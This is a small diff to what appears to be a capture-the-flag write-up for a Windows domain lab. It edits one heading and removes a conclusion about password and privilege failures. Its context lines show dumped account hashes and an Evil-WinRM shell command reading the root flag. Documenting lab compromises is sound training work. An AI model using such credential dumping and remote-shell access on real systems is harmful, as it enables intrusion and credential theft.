@@ -281,16 +281,10 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 ```
 
-Root flag in Administrator desktop
+Root flag on the `Administrator`'s Desktop
 ```powershell
 *Evil-WinRM* PS C:\Users\Administrator\Documents> more ../Desktop/root.txt
 ```
-
----
-
-## Conclusion
-
-Complete domain compromise achieved through poor password management practices and dangerous privilege assignments rather than software vulnerabilities.
 
 ---
 
